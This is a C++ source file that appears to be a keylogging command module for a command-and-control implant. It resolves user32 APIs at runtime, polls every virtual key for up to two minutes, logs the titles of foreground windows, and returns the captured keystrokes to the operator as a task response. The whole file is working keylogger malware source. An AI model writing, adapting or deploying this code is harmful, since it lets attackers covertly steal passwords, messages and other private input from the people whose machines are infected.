#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_KEYLOG

using namespace stardust;
using namespace starburst;

typedef SHORT ( WINAPI *fn_GetAsyncKeyState )( int );
typedef UINT  ( WINAPI *fn_MapVirtualKeyA )( UINT, UINT );
typedef HWND  ( WINAPI *fn_GetForegroundWindow )( void );
typedef int   ( WINAPI *fn_GetWindowTextA )( HWND, LPSTR, int );

auto declfn starburst::cmd_keylog(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    // duration in seconds (default 10 if 0 provided)
    uint32_t duration = parser_int32( params );
    if ( duration == 0 ) duration = 10;
    if ( duration > 120 ) duration = 120;  // cap at 2 minutes

    DBG_PRINT( inst, "cmd_keylog: duration=%u seconds\n", duration );

    auto h_user32 = inst.kernel32.LoadLibraryA( symbol<const char*>( "user32.dll" ) );
    if ( !h_user32 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to load user32.dll" ) ) );
        return;
    }

    auto pGetAsyncKeyState = reinterpret_cast<fn_GetAsyncKeyState>(
        inst.kernel32.GetProcAddress( h_user32,
            symbol<LPCSTR>( "GetAsyncKeyState" ) ) );
    auto pMapVirtualKeyA = reinterpret_cast<fn_MapVirtualKeyA>(
        inst.kernel32.GetProcAddress( h_user32,
            symbol<LPCSTR>( "MapVirtualKeyA" ) ) );
    auto pGetForegroundWindow = reinterpret_cast<fn_GetForegroundWindow>(
        inst.kernel32.GetProcAddress( h_user32,
            symbol<LPCSTR>( "GetForegroundWindow" ) ) );
    auto pGetWindowTextA = reinterpret_cast<fn_GetWindowTextA>(
        inst.kernel32.GetProcAddress( h_user32,
            symbol<LPCSTR>( "GetWindowTextA" ) ) );

    if ( !pGetAsyncKeyState || !pMapVirtualKeyA ||
         !pGetForegroundWindow || !pGetWindowTextA ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to resolve keylog APIs" ) ) );
        return;
    }

    uint32_t buf_cap = 4096;
    auto buffer = static_cast<char*>( inst.heap_alloc( buf_cap ) );
    if ( !buffer ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }
    uint32_t buf_off = 0;

    // track foreground window to log window title changes
    HWND last_window = nullptr;
    char win_title[256] = { 0 };

    DWORD start_tick = inst.kernel32.GetTickCount();
    DWORD end_tick   = start_tick + ( duration * 1000 );

    while ( inst.kernel32.GetTickCount() < end_tick ) {
        // check for foreground window change
        HWND cur_window = pGetForegroundWindow();
        if ( cur_window && cur_window != last_window ) {
            last_window = cur_window;
            mem_set( win_title, 0, 256 );
            pGetWindowTextA( cur_window, win_title, 255 );

            if ( win_title[0] && buf_off + 512 < buf_cap ) {
                str_copy( buffer + buf_off, symbol<char*>( const_cast<char*>( "\n[" ) ) );
                buf_off += 2;
                uint32_t tlen = str_len( win_title );
                if ( tlen > 200 ) tlen = 200;
                memory::copy( buffer + buf_off, win_title, tlen );
                buf_off += tlen;
                str_copy( buffer + buf_off, symbol<char*>( const_cast<char*>( "]\n" ) ) );
                buf_off += 2;
            }
        }

        // poll all virtual keys
        for ( int vk = 0x08; vk <= 0xFE; vk++ ) {
            SHORT state = pGetAsyncKeyState( vk );
            // bit 0 = toggled since last call (newly pressed)
            if ( !( state & 1 ) ) continue;

            if ( buf_off + 16 >= buf_cap ) break;

            // handle special keys
            if ( vk == VK_RETURN ) {
                str_copy( buffer + buf_off, symbol<char*>( const_cast<char*>( "[ENTER]\n" ) ) );
                buf_off += 8;
            } else if ( vk == VK_TAB ) {
                str_copy( buffer + buf_off, symbol<char*>( const_cast<char*>( "[TAB]" ) ) );
                buf_off += 5;
            } else if ( vk == VK_BACK ) {
                str_copy( buffer + buf_off, symbol<char*>( const_cast<char*>( "[BS]" ) ) );
                buf_off += 4;
            } else if ( vk == VK_ESCAPE ) {
                str_copy( buffer + buf_off, symbol<char*>( const_cast<char*>( "[ESC]" ) ) );
                buf_off += 5;
            } else if ( vk == VK_SPACE ) {
                buffer[buf_off++] = ' ';
            } else if ( vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT ) {
                // skip shift keys themselves
            } else if ( vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL ) {
                // skip control keys themselves
            } else if ( vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU ) {
                // skip alt keys themselves
            } else if ( vk == VK_CAPITAL ) {
                str_copy( buffer + buf_off, symbol<char*>( const_cast<char*>( "[CAPS]" ) ) );
                buf_off += 6;
            } else if ( vk >= 0x30 && vk <= 0x39 ) {
                // digit keys: check shift for symbols
                SHORT shift_state = pGetAsyncKeyState( VK_SHIFT );
                if ( shift_state & 0x8000 ) {
                    // shifted digits -> symbols
                    char shifted[] = { ')', '!', '@', '#', '$', '%', '^', '&', '*', '(' };
                    buffer[buf_off++] = shifted[vk - 0x30];
                } else {
                    buffer[buf_off++] = (char)vk;
                }
            } else if ( vk >= 0x41 && vk <= 0x5A ) {
                // letter keys
                SHORT shift_state = pGetAsyncKeyState( VK_SHIFT );
                if ( shift_state & 0x8000 ) {
                    buffer[buf_off++] = (char)vk;  // uppercase
                } else {
                    buffer[buf_off++] = (char)( vk + 0x20 );  // lowercase
                }
            } else if ( vk >= VK_F1 && vk <= VK_F12 ) {
                str_copy( buffer + buf_off, symbol<char*>( const_cast<char*>( "[F" ) ) );
                buf_off += 2;
                char fnum[4];
                int_to_str( fnum, vk - VK_F1 + 1, 10 );
                uint32_t flen = str_len( fnum );
                memory::copy( buffer + buf_off, fnum, flen );
                buf_off += flen;
                buffer[buf_off++] = ']';
            } else if ( vk == VK_OEM_PERIOD ) {
                buffer[buf_off++] = '.';
            } else if ( vk == VK_OEM_COMMA ) {
                buffer[buf_off++] = ',';
            } else if ( vk == VK_OEM_MINUS ) {
                buffer[buf_off++] = '-';
            } else if ( vk == VK_OEM_PLUS ) {
                buffer[buf_off++] = '=';
            } else {
                // try MapVirtualKeyA for anything else printable
                UINT ch = pMapVirtualKeyA( vk, 2 );  // MAPVK_VK_TO_CHAR = 2
                if ( ch >= 0x20 && ch <= 0x7E ) {
                    buffer[buf_off++] = (char)ch;
                }
            }
        }

        // sleep ~50ms between polls
        LARGE_INTEGER delay;
        delay.QuadPart = -500000LL;  // 50ms in 100ns units, negative = relative
        inst.ntdll.NtDelayExecution( FALSE, &delay );
    }

    buffer[buf_off] = '\0';

    if ( buf_off == 0 ) {
        str_copy( buffer, symbol<char*>( const_cast<char*>( "(no keystrokes captured)" ) ) );
    }

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, buffer );
    inst.heap_free( buffer );
}

#endif
